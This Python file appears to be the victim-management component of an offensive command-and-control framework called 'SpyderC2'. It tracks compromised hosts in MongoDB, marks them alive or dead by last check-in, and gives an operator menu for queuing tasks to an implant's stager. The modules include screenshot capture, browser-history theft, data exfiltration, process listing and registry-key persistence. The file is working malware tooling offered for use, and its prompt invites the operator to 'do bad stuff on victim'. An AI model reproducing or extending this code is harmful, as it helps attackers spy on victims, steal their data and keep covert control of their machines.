import datetime
import pdb
import random
import string
from lib.task import Task
from lib.module import Module
from termcolor import colored
import readline
import re
import os


class Victim:

	mongoclient = None
	victims = {}

	## Modules supported by various OS and their language support
	module_hash = {
			'Windows' : {
				'screenshot': {'utility': 'collection'},
				'browser_history':{'utility': 'collection'},
				'exfiltration':{'utility': 'collection'},
				'running_processes':{'utility': 'collection'},
				'registrykey':{'utility': 'persistence'}
				},

			'Linux': {
				'screenshot': {'utility': 'collection'},
				'exfiltration':{'utility': 'collection'},
				'running_processes':{'utility': 'collection'},
			}
		}
	language_supported = {
		'screenshot':['powershell','python'],
		'browser_history': ['powershell','python'],
		'exfiltration': ['powershell','python'],
		'running_processes':['powershell','python'],
		'registrykey':['powershell','python']
		}

	databasename = os.environ['MONGODB_DATABASE']

	def __init__(self,victim_id,platform,os_version,admin,location,status = 'Alive',lastseen = datetime.datetime.now(),add_db = True):
		self.victim_id = victim_id
		self.platform = platform
		self.os_version = os_version
		self.admin = admin
		self.location = location
		self.lastseen = lastseen
		self.status = status
		self.victims[self.victim_id] = self
		self.modules = self.module_hash[self.platform]
		self.tasks = {}
		## To prevent adding to db when we are running load_victims_from_db
		if add_db : self.add_victim_to_db()

	## Shows the various victim present in the db/connected with the server. maybe dead or alive.
	@classmethod
	def show_victims(cls):
		print(f"\nTo interact with a victim run {colored('use <victim_id>','cyan')}")
		print("")
		print("Victim IDs		Victim Status")
		print("----------		-------------")
		for victim in cls.victims:
			print(f"{victim}		{cls.victims[victim].status}")


	@classmethod
	## Shows victim help menu
	def display_victim_help_menu(cls):
		print('--------------------------------------')
		print('|          VICTIM HELP MENU           |')
		print('--------------------------------------')
		commands = {'info':'Shows current victim information.' , 'modules': 'Shows modules executable on current victim.', 'tasks':'Show the task issued to the current victim and if there is output','kill': 
		'Kill Victim', 'back': 'Go back to main menu.'}

		for command in commands.keys():
			print(colored(command,'cyan') + " - " + commands[command])

	## This will load the victim info present in DB, created from server.py and instanitate objects for them.
	@classmethod
	def load_victims_from_db(cls):

		mydb = cls.mongoclient[cls.databasename]
		victims = mydb["victims"]

		victim_list = victims.find()

		for victim in victim_list:
			if (victim['victim_id'] not in Victim.victims.keys()):
				## We instantiate object for the victims server.py has seen(which already hasn't been instantiated)
				Victim(victim['victim_id'],victim['platform'],victim['os_version'],victim['admin'],victim['location'],victim['status'],victim['lastseen'],False)
			else:
				Victim.victims[victim['victim_id']].update_last_seen_status_from_db()
				Victim.victims[victim['victim_id']].get_victim_health_status()



	@classmethod
	## Loading the tasks to self.tasks of victim objects, creating it for when db is loaded when main.py starts
	## TODO : why do we need self.tasks ? Why can't we use the tasks array in Task class which has the victim id ?
	def load_tasks_to_victim(cls):
		for victim in cls.victims:
			for task in Task.tasks:
				## Sorry for confusing namings, Victim = classname , victims is the dictionary having info of all victims, victim is the id, same for tasks
				if victim == Task.tasks[task].victim_id:
					Victim.victims[victim].tasks[task] = Task.tasks[task]

	## Gets the last seen and status of the victim. If lastseen > 60secs, vicitim considered dead.
	def get_victim_health_status(self):
		time = datetime.datetime.now() - self.lastseen
		if time.total_seconds() > 60:
			self.status = 'Dead'
		return time

	## TODO : merge the below function and generalize for any attribute
	## Called from main.py side, to update the location in case victim has reregistered
	def update_location_from_db(self):
		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}

		victim = victims.find_one(h)

		if victim:
			self.location = victim['location']

	## Called from main.py side, to update the last seen and status according to db (updated from the server.py side)
	def update_last_seen_status_from_db(self):
		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}

		victim = victims.find_one(h)

		if victim:
			self.lastseen = victim['lastseen']
			self.status = victim['status']

	## Gets the various info of the victim. Trigerred by the info command.
	def get_victim_info(self):
		self.update_last_seen_status_from_db()
		self.update_location_from_db()
		time = self.get_victim_health_status()

		print(f"{colored('ID','cyan')} - {self.victim_id} \n{colored('Platform','cyan')} - {self.platform} \n{colored('OS Version','cyan')} - {self.os_version} \n{colored('Admin Privileges','cyan')} - {self.admin} \n{colored('Stager Location','cyan')} - {self.location} \n{colored('lastseen','cyan')} - {self.lastseen} \n{colored('status','cyan')} - {self.status} \n{colored('Seen','cyan')} - {str(time.total_seconds())} secs ago")
		

	def show_tasks(self):
		if not self.tasks:
			print(colored('No tasks to show','yellow'))
		for key in self.tasks.keys():
			task_obj = self.tasks[key]
			task_obj.update_task_from_db()
			print(f"{colored('Task ID','cyan')} - {task_obj.task_id} \n{colored('Command','cyan')} - {task_obj.command} \n{colored('Command Output','cyan')} - {task_obj.output} \n{colored('Issued','cyan')} - {task_obj.issued}")
			print("------------------------")

	def get_module_language(self,module):
		## Does linux support powershell?
		if self.platform == 'Linux':
			return 'python'

		while True:
			print(colored("\nModules are supported in powershell (Windows only) and python langauge. Press enter for default, python. Please select language",'cyan'))
			language = str(input())
			language = language.lower()

			if language == '':
				language = 'python'

			if language in ['powershell','python']:
				if language in self.language_supported[module]:
					return language
				else:
					print(colored(f"\nSorry {module} doesn't support {language}. Try the other langauge.",'yellow'))
			elif language in ['back','exit']:
				return False
			else:
				print(colored("Sorry not supported language",'yellow'))
				continue

	## Displays the victim menu
	def victim_menu(self):
		self.display_victim_help_menu()
		print(f"\nYou are now interacting with the victim. To do bad stuff on victim, you might want to run {colored('modules','cyan')} commands to see the modules you can run and then use it by running '{colored('use <module_name>','cyan')}'\n")
		while True:
			cmd = str(input(colored(f"(SpyderC2: Victim) {colored(self.victim_id,'cyan')} > ",'red')))

			if cmd == 'info':
				self.get_victim_info()

			elif cmd == 'modules':
				print(list(self.modules.keys()))

			elif cmd ==  'tasks':
				self.show_tasks()
			elif cmd == 'back' or cmd == 'exit':
				print("Going back to main menu...")
				return

			elif cmd == 'help':
				self.display_victim_help_menu()
			elif cmd == 'kill':

				## Creates a task with the command kill
				task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))
				task = Task(victim_id = self.victim_id ,command = 'kill', utility= 'collection', language='python',options = {}, task_id = task_id)
				self.tasks[task.task_id] = task

			elif re.match(r'^use .*$',cmd):

				## Before trying to assign task, see if victim alive
				self.update_last_seen_status_from_db()
				if self.status == 'Dead':
					print(colored("\nSorry victim dead, can't assign task",'yellow'))
					continue

				module = re.findall(r'^use (.*)$',cmd)[0]
				if module in self.modules:
					utility = self.modules[module]['utility']
					language = self.get_module_language(module)
					Module.show_options(module,utility)

					## Gets the paramters for a module which user might customize
					option_hash = Module.module_menu(module,utility)


					## In case user does not want to run module, option hash will be False else it will be a dictionary
					if option_hash != False:
						## Adding the stager location in this hash, as this may be needed by some modules
						self.update_location_from_db()
						option_hash['stager_location'] = f"{self.location}\\stager.exe"
						task_id = ''.join(random.choices(string.ascii_lowercase +string.digits, k = 7))

						## Here we are only inserting the module name as command, the actual script will be loaded on the server.py side
						task = Task(victim_id = self.victim_id ,command = module,language=language, utility = utility , options = option_hash, task_id = task_id)
						self.tasks[task.task_id] = task

				else:
					## TODO- add to logger
					print(colored('\nNot a valid module. See the supported modules by running the "modules" command','yellow'))
			elif cmd == '':
				print()
				pass
			else:
				print(f"\nNot supported. Type {colored('help','cyan')} to see commands supported.")

	def add_victim_to_db(self):

		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]

		h = {'victim_id' : self.victim_id, 'platform' : self.platform ,'os_version' : self.os_version, 'admin': self.admin, 'location': self.location, 'status': self.status, 'lastseen' : self.lastseen}
		victims.insert_one(h)


	## TODO  : merge both update_location and update_last_seen_status_to_db to oen egenralized function, where we just provide attribute and new value
	## Updates location if a victim rerigisters
	def update_location_to_db(self):
		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}
		victims.find_one_and_update(h,{ "$set": { "location": self.location } })

	## Updates last seen whenever a new request is seen from the victim
	def update_last_seen_status_to_db(self):
		time = datetime.datetime.now()

		self.lastseen = time
		mydb = self.mongoclient[self.databasename]
		victims = mydb["victims"]
		h = {'victim_id':self.victim_id}
		victims.find_one_and_update(h,{ "$set": { "lastseen": time , "status": self.status} })


## For future

class WindowsVictim(Victim):
	pass


class LinuxVictim(Victim):
	pass


class MacVictim(Victim):
	pass